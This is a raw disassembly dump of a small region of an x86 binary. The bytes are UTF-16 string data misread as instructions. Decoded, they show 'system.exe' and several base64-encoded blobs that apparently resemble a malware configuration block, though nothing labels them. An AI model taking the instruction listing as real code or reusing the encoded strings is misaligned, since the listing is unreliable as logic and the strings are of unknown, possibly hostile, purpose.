  409559:	00 61 00             	add    %ah,0x0(%ecx)
  40955c:	74 00                	je     0x40955e
  40955e:	61                   	popa
  40955f:	00 25 00 00 15 73    	add    %ah,0x73150000
  409565:	00 79 00             	add    %bh,0x0(%ecx)
  409568:	73 00                	jae    0x40956a
  40956a:	74 00                	je     0x40956c
  40956c:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409570:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409574:	78 00                	js     0x409576
  409576:	65 00 00             	add    %al,%gs:(%eax)
  409579:	59                   	pop    %ecx
  40957a:	61                   	popa
  40957b:	00 7a 00             	add    %bh,0x0(%edx)
  40957e:	56                   	push   %esi
  40957f:	00 6b 00             	add    %ch,0x0(%ebx)
  409582:	57                   	push   %edi
  409583:	00 58 00             	add    %bl,0x0(%eax)
  409586:	4e                   	dec    %esi
  409587:	00 4d 00             	add    %cl,0x0(%ebp)
  40958a:	61                   	popa
  40958b:	00 47 00             	add    %al,0x0(%edi)
  40958e:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  409592:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
  409597:	00 69 00             	add    %ch,0x0(%ecx)
  40959a:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40959e:	6c                   	insb   (%dx),%es:(%edi)
  40959f:	00 53 00             	add    %dl,0x0(%ebx)
  4095a2:	54                   	push   %esp
  4095a3:	00 58 00             	add    %bl,0x0(%eax)
  4095a6:	68 00 55 00 54       	push   $0x54005500
  4095ab:	00 33                	add    %dh,(%ebx)
  4095ad:	00 42 00             	add    %al,0x0(%edx)
  4095b0:	6a 00                	push   $0x0
  4095b2:	51                   	push   %ecx
  4095b3:	00 56 00             	add    %dl,0x0(%esi)
  4095b6:	46                   	inc    %esi
  4095b7:	00 34 00             	add    %dh,(%eax,%eax,1)
  4095ba:	4f                   	dec    %edi
  4095bb:	00 45 00             	add    %al,0x0(%ebp)
  4095be:	5a                   	pop    %edx
  4095bf:	00 46 00             	add    %al,0x0(%esi)
  4095c2:	52                   	push   %edx
  4095c3:	00 57 00             	add    %dl,0x0(%edi)
  4095c6:	74 00                	je     0x4095c8
  4095c8:	77 00                	ja     0x4095ca
  4095ca:	61                   	popa
  4095cb:	00 55 00             	add    %dl,0x0(%ebp)
  4095ce:	6b 00 3d             	imul   $0x3d,(%eax),%eax
  4095d1:	00 00                	add    %al,(%eax)
  4095d3:	80 b1 51 00 54 00 68 	xorb   $0x68,0x540051(%ecx)
  4095da:	00 4e 00             	add    %cl,0x0(%esi)
  4095dd:	33 00                	xor    (%eax),%eax
  4095df:	46                   	inc    %esi
  4095e0:	00 2b                	add    %ch,(%ebx)
  4095e2:	00 48 00             	add    %cl,0x0(%eax)
  4095e5:	37                   	aaa
  4095e6:	00 61 00             	add    %ah,0x0(%ecx)
  4095e9:	42                   	inc    %edx
  4095ea:	00 76 00             	add    %dh,0x0(%esi)
  4095ed:	78 00                	js     0x4095ef
  4095ef:	6a 00                	push   $0x0
  4095f1:	71 00                	jno    0x4095f3
  4095f3:	79 00                	jns    0x4095f5
  4095f5:	52                   	push   %edx
  4095f6:	00 41 00             	add    %al,0x0(%ecx)
  4095f9:	35 00 67 00 46       	xor    $0x46006700,%eax
  4095fe:	00 6e 00             	add    %ch,0x0(%esi)
  409601:	55                   	push   %ebp
  409602:	00 69 00             	add    %ch,0x0(%ecx)
  409605:	47                   	inc    %edi
  409606:	00 74 00 46          	add    %dh,0x46(%eax,%eax,1)
  40960a:	00 56 00             	add    %dl,0x0(%esi)
  40960d:	68 00 70 00 43       	push   $0x43007000
  409612:	00 34 00             	add    %dh,(%eax,%eax,1)
  409615:	44                   	inc    %esp
  409616:	00 71 00             	add    %dh,0x0(%ecx)
  409619:	4e                   	dec    %esi
  40961a:	00 79 00             	add    %bh,0x0(%ecx)
  40961d:	72 00                	jb     0x40961f
  40961f:	34 00                	xor    $0x0,%al
  409621:	54                   	push   %esp
  409622:	00 35 00 58 00 65    	add    %dh,0x65005800
  409628:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40962c:	00 61 00             	add    %ah,0x0(%ecx)
  40962f:	45                   	inc    %ebp
  409630:	00 43 00             	add    %al,0x0(%ebx)
  409633:	77 00                	ja     0x409635
  409635:	39 00                	cmp    %eax,(%eax)
  409637:	52                   	push   %edx
  409638:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40963c:	00 6a 00             	add    %ch,0x0(%edx)
  40963f:	4f                   	dec    %edi
  409640:	00 72 00             	add    %dh,0x0(%edx)
  409643:	66 00 50 00          	data16 add %dl,0x0(%eax)
  409647:	4c                   	dec    %esp
  409648:	00 51 00             	add    %dl,0x0(%ecx)
  40964b:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40964f:	67 00 50 00          	add    %dl,0x0(%bx,%si)
  409653:	57                   	push   %edi
  409654:	00 6a 00             	add    %ch,0x0(%edx)
  409657:	55                   	push   %ebp
  409658:	00 7a 00             	add    %bh,0x0(%edx)
  40965b:	45                   	inc    %ebp
  40965c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40965f:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  409663:	69 00 36 00 48 00    	imul   $0x480036,(%eax),%eax
  409669:	42                   	inc    %edx
  40966a:	00 68 00             	add    %ch,0x0(%eax)
  40966d:	4a                   	dec    %edx
  40966e:	00 32                	add    %dh,(%edx)
  409670:	00 53 00             	add    %dl,0x0(%ebx)
  409673:	35 00 76 00 4b       	xor    $0x4b007600,%eax
  409678:	00 72 00             	add    %dh,0x0(%edx)
  40967b:	74 00                	je     0x40967d
  40967d:	44                   	inc    %esp
  40967e:	00 77 00             	add    %dh,0x0(%edi)
  409681:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409686:	92                   	xchg   %eax,%edx
  409687:	59                   	pop    %ecx
  409688:	55                   	push   %ebp
  409689:	00 30                	add    %dh,(%eax)
  40968b:	00 41 00             	add    %al,0x0(%ecx)
  40968e:	78 00                	js     0x409690
  409690:	58                   	pop    %eax
  409691:	00 42 00             	add    %al,0x0(%edx)
  409694:	6d                   	insl   (%dx),%es:(%edi)
  409695:	00 30                	add    %dh,(%eax)
  409697:	00 71 00             	add    %dh,0x0(%ecx)
  40969a:	6e                   	outsb  %ds:(%esi),(%dx)
  40969b:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  40969f:	00 4b 00             	add    %cl,0x0(%ebx)
  4096a2:	42                   	inc    %edx
  4096a3:	00 4d 00             	add    %cl,0x0(%ebp)
  4096a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4096a7:	00 49 00             	add    %cl,0x0(%ecx)
  4096aa:	45                   	inc    %ebp
  4096ab:	00 47 00             	add    %al,0x0(%edi)
  4096ae:	56                   	push   %esi
  4096af:	00 31                	add    %dh,(%ecx)
  4096b1:	00 76 00             	add    %dh,0x0(%esi)
  4096b4:	57                   	push   %edi
  4096b5:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  4096b9:	00 76 00             	add    %dh,0x0(%esi)
  4096bc:	52                   	push   %edx
  4096bd:	00 75 00             	add    %dh,0x0(%ebp)
  4096c0:	73 00                	jae    0x4096c2
  4096c2:	58                   	pop    %eax
  4096c3:	00 72 00             	add    %dh,0x0(%edx)
  4096c6:	57                   	push   %edi
  4096c7:	00 6f 00             	add    %ch,0x0(%edi)
  4096ca:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  4096ce:	53                   	push   %ebx
  4096cf:	00 4c 00 66          	add    %cl,0x66(%eax,%eax,1)
  4096d3:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  4096d7:	00 59 00             	add    %bl,0x0(%ecx)
  4096da:	77 00                	ja     0x4096dc
  4096dc:	34 00                	xor    $0x0,%al
  4096de:	69 00 70 00 55 00    	imul   $0x550070,(%eax),%eax
  4096e4:	6d                   	insl   (%dx),%es:(%edi)
  4096e5:	00 70 00             	add    %dh,0x0(%eax)
  4096e8:	52                   	push   %edx
  4096e9:	00 78 00             	add    %bh,0x0(%eax)
  4096ec:	62 00                	bound  %eax,(%eax)
  4096ee:	42                   	inc    %edx
  4096ef:	00 77 00             	add    %dh,0x0(%edi)
  4096f2:	6a 00                	push   $0x0
  4096f4:	57                   	push   %edi
  4096f5:	00 4d 00             	add    %cl,0x0(%ebp)
  4096f8:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  4096fc:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  409700:	50                   	push   %eax
  409701:	00 36                	add    %dh,(%esi)
  409703:	00 30                	add    %dh,(%eax)
  409705:	00 71 00             	add    %dh,0x0(%ecx)
  409708:	79 00                	jns    0x40970a
  40970a:	6c                   	insb   (%dx),%es:(%edi)
  40970b:	00 37                	add    %dh,(%edi)
  40970d:	00 42 00             	add    %al,0x0(%edx)
  409710:	63 00                	arpl   %eax,(%eax)
  409712:	77 00                	ja     0x409714
  409714:	45                   	inc    %ebp
  409715:	00 35 00 76 00 54    	add    %dh,0x54007600
  40971b:	00 4e 00             	add    %cl,0x0(%esi)
  40971e:	58                   	pop    %eax
  40971f:	00 67 00             	add    %ah,0x0(%edi)
  409722:	31 00                	xor    %eax,(%eax)
  409724:	63 00                	arpl   %eax,(%eax)
  409726:	53                   	push   %ebx
  409727:	00 77 00             	add    %dh,0x0(%edi)
  40972a:	57                   	push   %edi
  40972b:	00 71 00             	add    %dh,0x0(%ecx)
  40972e:	56                   	push   %esi
  40972f:	00 4f 00             	add    %cl,0x0(%edi)
  409732:	5a                   	pop    %edx
  409733:	00 6a 00             	add    %ch,0x0(%edx)
  409736:	6e                   	outsb  %ds:(%esi),(%dx)
  409737:	00 46 00             	add    %al,0x0(%esi)
  40973a:	4e                   	dec    %esi
  40973b:	00 6b 00             	add    %ch,0x0(%ebx)
  40973e:	34 00                	xor    $0x0,%al
  409740:	7a 00                	jp     0x409742
  409742:	6c                   	insb   (%dx),%es:(%edi)
  409743:	00 59 00             	add    %bl,0x0(%ecx)
  409746:	6a 00                	push   $0x0
  409748:	69 00 44 00 42 00    	imul   $0x420044,(%eax),%eax
  40974e:	37                   	aaa
  40974f:	00 59 00             	add    %bl,0x0(%ecx)
  409752:	31 00                	xor    %eax,(%eax)
  409754:	63 00                	arpl   %eax,(%eax)
  409756:	4b                   	dec    %ebx
  409757:	00 6a 00             	add    %ch,0x0(%edx)
  40975a:	33 00                	xor    (%eax),%eax
  40975c:	4a                   	dec    %edx
  40975d:	00 77 00             	add    %dh,0x0(%edi)
  409760:	58                   	pop    %eax
  409761:	00 75 00             	add    %dh,0x0(%ebp)
  409764:	56                   	push   %esi
  409765:	00 7a 00             	add    %bh,0x0(%edx)
  409768:	43                   	inc    %ebx
  409769:	00 7a 00             	add    %bh,0x0(%edx)
  40976c:	67 00 54 00          	add    %dl,0x0(%si)
  409770:	38 00                	cmp    %al,(%eax)
  409772:	6d                   	insl   (%dx),%es:(%edi)
  409773:	00 37                	add    %dh,(%edi)
  409775:	00 77 00             	add    %dh,0x0(%edi)
  409778:	76 00                	jbe    0x40977a
  40977a:	75 00                	jne    0x40977c
  40977c:	4a                   	dec    %edx
  40977d:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  409781:	00 37                	add    %dh,(%edi)
  409783:	00 34 00             	add    %dh,(%eax,%eax,1)
  409786:	4d                   	dec    %ebp
  409787:	00 66 00             	add    %ah,0x0(%esi)
  40978a:	53                   	push   %ebx
  40978b:	00 71 00             	add    %dh,0x0(%ecx)
  40978e:	57                   	push   %edi
  40978f:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  409793:	00 38                	add    %bh,(%eax)
  409795:	00 35 00 46 00 49    	add    %dh,0x49004600
  40979b:	00 37                	add    %dh,(%edi)
  40979d:	00 69 00             	add    %ch,0x0(%ecx)
  4097a0:	63 00                	arpl   %eax,(%eax)
  4097a2:	58                   	pop    %eax
  4097a3:	00 79 00             	add    %bh,0x0(%ecx)
  4097a6:	53                   	push   %ebx
  4097a7:	00 45 00             	add    %al,0x0(%ebp)
  4097aa:	57                   	push   %edi
  4097ab:	00 74 00 38          	add    %dh,0x38(%eax,%eax,1)
  4097af:	00 78 00             	add    %bh,0x0(%eax)
  4097b2:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  4097b6:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  4097ba:	71 00                	jno    0x4097bc
  4097bc:	56                   	push   %esi
  4097bd:	00 66 00             	add    %ah,0x0(%esi)
  4097c0:	41                   	inc    %ecx
  4097c1:	00 59 00             	add    %bl,0x0(%ecx)
  4097c4:	34 00                	xor    $0x0,%al
  4097c6:	74 00                	je     0x4097c8
  4097c8:	34 00                	xor    $0x0,%al
  4097ca:	4f                   	dec    %edi
  4097cb:	00 36                	add    %dh,(%esi)
  4097cd:	00 33                	add    %dh,(%ebx)
  4097cf:	00 2f                	add    %ch,(%edi)
  4097d1:	00 65 00             	add    %ah,0x0(%ebp)
  4097d4:	77 00                	ja     0x4097d6
  4097d6:	54                   	push   %esp
  4097d7:	00 38                	add    %bh,(%eax)
  4097d9:	00 4d 00             	add    %cl,0x0(%ebp)
  4097dc:	31 00                	xor    %eax,(%eax)
  4097de:	46                   	inc    %esi
  4097df:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  4097e3:	00 37                	add    %dh,(%edi)
  4097e5:	00 38                	add    %bh,(%eax)
  4097e7:	00 72 00             	add    %dh,0x0(%edx)
  4097ea:	58                   	pop    %eax
  4097eb:	00 70 00             	add    %dh,0x0(%eax)
  4097ee:	55                   	push   %ebp
  4097ef:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  4097f3:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  4097f7:	00 78 00             	add    %bh,0x0(%eax)
  4097fa:	49                   	dec    %ecx
  4097fb:	00 71 00             	add    %dh,0x0(%ecx)
  4097fe:	73 00                	jae    0x409800
  409800:	68 00 2b 00 39       	push   $0x39002b00
  409805:	00 52 00             	add    %dl,0x0(%edx)
  409808:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
  40980c:	6d                   	insl   (%dx),%es:(%edi)
  40980d:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  409811:	00 35 00 72 00 38    	add    %dh,0x38007200
  409817:	00 69 00             	add    %ch,0x0(%ecx)
  40981a:	58                   	pop    %eax
  40981b:	00 69 00             	add    %ch,0x0(%ecx)
  40981e:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  409822:	42                   	inc    %edx
  409823:	00 6e 00             	add    %ch,0x0(%esi)
  409826:	46                   	inc    %esi
  409827:	00 6f 00             	add    %ch,0x0(%edi)
  40982a:	38 00                	cmp    %al,(%eax)
  40982c:	69 00 69 00 2b 00    	imul   $0x2b0069,(%eax),%eax
  409832:	7a 00                	jp     0x409834
  409834:	74 00                	je     0x409836
  409836:	49                   	dec    %ecx
  409837:	00 50 00             	add    %dl,0x0(%eax)
  40983a:	55                   	push   %ebp
  40983b:	00 53 00             	add    %dl,0x0(%ebx)
  40983e:	6d                   	insl   (%dx),%es:(%edi)
  40983f:	00 43 00             	add    %al,0x0(%ebx)
  409842:	39 00                	cmp    %eax,(%eax)
  409844:	45                   	inc    %ebp
  409845:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  409849:	00 47 00             	add    %al,0x0(%edi)
  40984c:	32 00                	xor    (%eax),%al
  40984e:	69 00 54 00 45 00    	imul   $0x450054,(%eax),%eax
  409854:	44                   	inc    %esp
  409855:	00 6d 00             	add    %ch,0x0(%ebp)
  409858:	71 00                	jno    0x40985a
  40985a:	72 00                	jb     0x40985c
  40985c:	45                   	inc    %ebp
  40985d:	00 62 00             	add    %ah,0x0(%edx)
  409860:	6d                   	insl   (%dx),%es:(%edi)
  409861:	00 70 00             	add    %dh,0x0(%eax)
  409864:	72 00                	jb     0x409866
  409866:	6b 00 30             	imul   $0x30,(%eax),%eax
  409869:	00 62 00             	add    %ah,0x0(%edx)
  40986c:	52                   	push   %edx
  40986d:	00 53 00             	add    %dl,0x0(%ebx)
  409870:	74 00                	je     0x409872
  409872:	2b 00                	sub    (%eax),%eax
  409874:	69 00 5a 00 4b 00    	imul   $0x4b005a,(%eax),%eax
  40987a:	70 00                	jo     0x40987c
  40987c:	74 00                	je     0x40987e
  40987e:	6f                   	outsl  %ds:(%esi),(%dx)
  40987f:	00 67 00             	add    %ah,0x0(%edi)
  409882:	4e                   	dec    %esi
  409883:	00 59 00             	add    %bl,0x0(%ecx)
  409886:	46                   	inc    %esi
  409887:	00 41 00             	add    %al,0x0(%ecx)
  40988a:	4a                   	dec    %edx
  40988b:	00 35 00 5a 00 61    	add    %dh,0x61005a00
  409891:	00 57 00             	add    %dl,0x0(%edi)
  409894:	56                   	push   %esi
  409895:	00 59 00             	add    %bl,0x0(%ecx)
  409898:	30 00                	xor    %al,(%eax)
  40989a:	72 00                	jb     0x40989c
  40989c:	68 00 32 00 58       	push   $0x58003200
  4098a1:	00 63 00             	add    %ah,0x0(%ebx)
  4098a4:	74 00                	je     0x4098a6
  4098a6:	69 00 42 00 54 00    	imul   $0x540042,(%eax),%eax
  4098ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4098ad:	00 4a 00             	add    %cl,0x0(%edx)
  4098b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4098b1:	00 6d 00             	add    %ch,0x0(%ebp)
  4098b4:	67 00 45 00          	add    %al,0x0(%di)
  4098b8:	75 00                	jne    0x4098ba
  4098ba:	2f                   	das
  4098bb:	00 42 00             	add    %al,0x0(%edx)
  4098be:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  4098c2:	55                   	push   %ebp
  4098c3:	00 6e 00             	add    %ch,0x0(%esi)
  4098c6:	45                   	inc    %ebp
  4098c7:	00 6e 00             	add    %ch,0x0(%esi)
  4098ca:	48                   	dec    %eax
  4098cb:	00 77 00             	add    %dh,0x0(%edi)
  4098ce:	39 00                	cmp    %eax,(%eax)
  4098d0:	30 00                	xor    %al,(%eax)
  4098d2:	54                   	push   %esp
  4098d3:	00 59 00             	add    %bl,0x0(%ecx)
  4098d6:	41                   	inc    %ecx
  4098d7:	00 56 00             	add    %dl,0x0(%esi)
  4098da:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  4098de:	53                   	push   %ebx
  4098df:	00 38                	add    %bh,(%eax)
  4098e1:	00 30                	add    %dh,(%eax)
  4098e3:	00 76 00             	add    %dh,0x0(%esi)
  4098e6:	69 00 65 00 5a 00    	imul   $0x5a0065,(%eax),%eax
  4098ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4098ed:	00 57 00             	add    %dl,0x0(%edi)
  4098f0:	38 00                	cmp    %al,(%eax)
  4098f2:	4d                   	dec    %ebp
  4098f3:	00 4e 00             	add    %cl,0x0(%esi)
  4098f6:	2b 00                	sub    (%eax),%eax
  4098f8:	34 00                	xor    $0x0,%al
  4098fa:	54                   	push   %esp
  4098fb:	00 61 00             	add    %ah,0x0(%ecx)
  4098fe:	6c                   	insb   (%dx),%es:(%edi)
  4098ff:	00 6d 00             	add    %ch,0x0(%ebp)
  409902:	6b 00 35             	imul   $0x35,(%eax),%eax
  409905:	00 6e 00             	add    %ch,0x0(%esi)
  409908:	31 00                	xor    %eax,(%eax)
  40990a:	4d                   	dec    %ebp
  40990b:	00 46 00             	add    %al,0x0(%esi)
  40990e:	63 00                	arpl   %eax,(%eax)
  409910:	6b 00 66             	imul   $0x66,(%eax),%eax
  409913:	00 6b 00             	add    %ch,0x0(%ebx)
  409916:	6c                   	insb   (%dx),%es:(%edi)
  409917:	00 6c 00 4c          	add    %ch,0x4c(%eax,%eax,1)
  40991b:	00 78 00             	add    %bh,0x0(%eax)
  40991e:	53                   	push   %ebx
  40991f:	00 55 00             	add    %dl,0x0(%ebp)
  409922:	49                   	dec    %ecx
  409923:	00 71 00             	add    %dh,0x0(%ecx)
  409926:	54                   	push   %esp
  409927:	00 42 00             	add    %al,0x0(%edx)
  40992a:	6e                   	outsb  %ds:(%esi),(%dx)
  40992b:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40992f:	00 72 00             	add    %dh,0x0(%edx)
  409932:	34 00                	xor    $0x0,%al
  409934:	75 00                	jne    0x409936
  409936:	59                   	pop    %ecx
  409937:	00 67 00             	add    %ah,0x0(%edi)
  40993a:	32 00                	xor    (%eax),%al
  40993c:	50                   	push   %eax
  40993d:	00 41 00             	add    %al,0x0(%ecx)
  409940:	59                   	pop    %ecx
  409941:	00 61 00             	add    %ah,0x0(%ecx)
  409944:	75 00                	jne    0x409946
  409946:	31 00                	xor    %eax,(%eax)
  409948:	6a 00                	push   $0x0
  40994a:	31 00                	xor    %eax,(%eax)
  40994c:	43                   	inc    %ebx
  40994d:	00 6b 00             	add    %ch,0x0(%ebx)
  409950:	50                   	push   %eax
  409951:	00 41 00             	add    %al,0x0(%ecx)
  409954:	78 00                	js     0x409956
  409956:	37                   	aaa
  409957:	00 53 00             	add    %dl,0x0(%ebx)
  40995a:	42                   	inc    %edx
  40995b:	00 63 00             	add    %ah,0x0(%ebx)
  40995e:	75 00                	jne    0x409960
  409960:	57                   	push   %edi
  409961:	00 51 00             	add    %dl,0x0(%ecx)
  409964:	4f                   	dec    %edi
  409965:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  409969:	00 5a 00             	add    %bl,0x0(%edx)
  40996c:	77 00                	ja     0x40996e
  40996e:	44                   	inc    %esp
  40996f:	00 55 00             	add    %dl,0x0(%ebp)
  409972:	67 00 4c 00          	add    %cl,0x0(%si)
  409976:	32 00                	xor    (%eax),%al
  409978:	78 00                	js     0x40997a
  40997a:	56                   	push   %esi
  40997b:	00 37                	add    %dh,(%edi)
  40997d:	00 4d 00             	add    %cl,0x0(%ebp)
  409980:	31 00                	xor    %eax,(%eax)
  409982:	51                   	push   %ecx
  409983:	00 36                	add    %dh,(%esi)
  409985:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  409989:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  40998d:	00 35 00 4c 00 73    	add    %dh,0x73004c00
  409993:	00 2b                	add    %ch,(%ebx)
  409995:	00 7a 00             	add    %bh,0x0(%edx)
  409998:	44                   	inc    %esp
  409999:	00 69 00             	add    %ch,0x0(%ecx)
  40999c:	48                   	dec    %eax
  40999d:	00 43 00             	add    %al,0x0(%ebx)
  4099a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4099a1:	00 38                	add    %bh,(%eax)
  4099a3:	00 4a 00             	add    %cl,0x0(%edx)
  4099a6:	58                   	pop    %eax
  4099a7:	00 6a 00             	add    %ch,0x0(%edx)
  4099aa:	38 00                	cmp    %al,(%eax)
  4099ac:	75 00                	jne    0x4099ae
  4099ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4099af:	00 36                	add    %dh,(%esi)
  4099b1:	00 66 00             	add    %ah,0x0(%esi)
  4099b4:	6c                   	insb   (%dx),%es:(%edi)
  4099b5:	00 42 00             	add    %al,0x0(%edx)
  4099b8:	2f                   	das
  4099b9:	00 30                	add    %dh,(%eax)
  4099bb:	00 45 00             	add    %al,0x0(%ebp)
  4099be:	79 00                	jns    0x4099c0
  4099c0:	42                   	inc    %edx
  4099c1:	00 71 00             	add    %dh,0x0(%ecx)
  4099c4:	53                   	push   %ebx
  4099c5:	00 5a 00             	add    %bl,0x0(%edx)
  4099c8:	33 00                	xor    (%eax),%eax
  4099ca:	44                   	inc    %esp
  4099cb:	00 43 00             	add    %al,0x0(%ebx)
  4099ce:	6d                   	insl   (%dx),%es:(%edi)
  4099cf:	00 53 00             	add    %dl,0x0(%ebx)
  4099d2:	44                   	inc    %esp
  4099d3:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
  4099d7:	00 39                	add    %bh,(%ecx)
  4099d9:	00 4e 00             	add    %cl,0x0(%esi)
  4099dc:	76 00                	jbe    0x4099de
  4099de:	6b 00 75             	imul   $0x75,(%eax),%eax
  4099e1:	00 36                	add    %dh,(%esi)
  4099e3:	00 75 00             	add    %dh,0x0(%ebp)
  4099e6:	39 00                	cmp    %eax,(%eax)
  4099e8:	49                   	dec    %ecx
  4099e9:	00 45 00             	add    %al,0x0(%ebp)
  4099ec:	51                   	push   %ecx
  4099ed:	00 69 00             	add    %ch,0x0(%ecx)
  4099f0:	4a                   	dec    %edx
  4099f1:	00 2b                	add    %ch,(%ebx)
  4099f3:	00 31                	add    %dh,(%ecx)
  4099f5:	00 2b                	add    %ch,(%ebx)
  4099f7:	00 34 00             	add    %dh,(%eax,%eax,1)
  4099fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4099fb:	00 72 00             	add    %dh,0x0(%edx)
  4099fe:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  409a02:	4b                   	dec    %ebx
  409a03:	00 32                	add    %dh,(%edx)
  409a05:	00 76 00             	add    %dh,0x0(%esi)
  409a08:	77 00                	ja     0x409a0a
  409a0a:	76 00                	jbe    0x409a0c
  409a0c:	4c                   	dec    %esp
  409a0d:	00 36                	add    %dh,(%esi)
  409a0f:	00 6b 00             	add    %ch,0x0(%ebx)
  409a12:	6b 00 67             	imul   $0x67,(%eax),%eax
  409a15:	00 48 00             	add    %cl,0x0(%eax)
  409a18:	42                   	inc    %edx
  409a19:	00 69 00             	add    %ch,0x0(%ecx)
  409a1c:	49                   	dec    %ecx
  409a1d:	00 72 00             	add    %dh,0x0(%edx)
  409a20:	6a 00                	push   $0x0
  409a22:	49                   	dec    %ecx
  409a23:	00 66 00             	add    %ah,0x0(%esi)
  409a26:	55                   	push   %ebp
  409a27:	00 4e 00             	add    %cl,0x0(%esi)
  409a2a:	4e                   	dec    %esi
  409a2b:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
  409a2f:	00 52 00             	add    %dl,0x0(%edx)
  409a32:	31 00                	xor    %eax,(%eax)
  409a34:	4e                   	dec    %esi
  409a35:	00 7a 00             	add    %bh,0x0(%edx)
  409a38:	50                   	push   %eax
  409a39:	00 34 00             	add    %dh,(%eax,%eax,1)
  409a3c:	68 00 39 00 7a       	push   $0x7a003900
  409a41:	00 54 00 35          	add    %dl,0x35(%eax,%eax,1)
  409a45:	00 4a 00             	add    %cl,0x0(%edx)
  409a48:	73 00                	jae    0x409a4a
  409a4a:	69 00 6f 00 38 00    	imul   $0x38006f,(%eax),%eax
  409a50:	4c                   	dec    %esp
  409a51:	00 4d 00             	add    %cl,0x0(%ebp)
  409a54:	38 00                	cmp    %al,(%eax)
  409a56:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  409a5a:	69 00 54 00 68 00    	imul   $0x680054,(%eax),%eax
  409a60:	4a                   	dec    %edx
  409a61:	00 31                	add    %dh,(%ecx)
  409a63:	00 43 00             	add    %al,0x0(%ebx)
  409a66:	34 00                	xor    $0x0,%al
  409a68:	76 00                	jbe    0x409a6a
  409a6a:	45                   	inc    %ebp
  409a6b:	00 6d 00             	add    %ch,0x0(%ebp)
  409a6e:	6e                   	outsb  %ds:(%esi),(%dx)
  409a6f:	00 61 00             	add    %ah,0x0(%ecx)
  409a72:	6a 00                	push   $0x0
  409a74:	30 00                	xor    %al,(%eax)
  409a76:	56                   	push   %esi
  409a77:	00 34 00             	add    %dh,(%eax,%eax,1)
  409a7a:	72 00                	jb     0x409a7c
  409a7c:	6a 00                	push   $0x0
  409a7e:	61                   	popa
  409a7f:	00 45 00             	add    %al,0x0(%ebp)
  409a82:	51                   	push   %ecx
  409a83:	00 30                	add    %dh,(%eax)
  409a85:	00 32                	add    %dh,(%edx)
  409a87:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  409a8b:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  409a8f:	00 4d 00             	add    %cl,0x0(%ebp)
  409a92:	7a 00                	jp     0x409a94
  409a94:	45                   	inc    %ebp
  409a95:	00 57 00             	add    %dl,0x0(%edi)
  409a98:	6e                   	outsb  %ds:(%esi),(%dx)
  409a99:	00 46 00             	add    %al,0x0(%esi)
  409a9c:	4b                   	dec    %ebx
  409a9d:	00 50 00             	add    %dl,0x0(%eax)
  409aa0:	53                   	push   %ebx
  409aa1:	00 75 00             	add    %dh,0x0(%ebp)
  409aa4:	56                   	push   %esi
  409aa5:	00 59 00             	add    %bl,0x0(%ecx)
  409aa8:	50                   	push   %eax
  409aa9:	00 4e 00             	add    %cl,0x0(%esi)
  409aac:	71 00                	jno    0x409aae
  409aae:	6e                   	outsb  %ds:(%esi),(%dx)
  409aaf:	00 75 00             	add    %dh,0x0(%ebp)
  409ab2:	68 00 75 00 49       	push   $0x49007500
  409ab7:	00 63 00             	add    %ah,0x0(%ebx)
  409aba:	62 00                	bound  %eax,(%eax)
  409abc:	70 00                	jo     0x409abe
  409abe:	59                   	pop    %ecx
  409abf:	00 51 00             	add    %dl,0x0(%ecx)
  409ac2:	49                   	dec    %ecx
  409ac3:	00 68 00             	add    %ch,0x0(%eax)
  409ac6:	37                   	aaa
  409ac7:	00 38                	add    %bh,(%eax)
  409ac9:	00 43 00             	add    %al,0x0(%ebx)
  409acc:	56                   	push   %esi
  409acd:	00 78 00             	add    %bh,0x0(%eax)
  409ad0:	32 00                	xor    (%eax),%al
  409ad2:	47                   	inc    %edi
  409ad3:	00 78 00             	add    %bh,0x0(%eax)
  409ad6:	43                   	inc    %ebx
  409ad7:	00 4e 00             	add    %cl,0x0(%esi)
  409ada:	7a 00                	jp     0x409adc
  409adc:	4c                   	dec    %esp
  409add:	00 4d 00             	add    %cl,0x0(%ebp)
  409ae0:	6f                   	outsl  %ds:(%esi),(%dx)
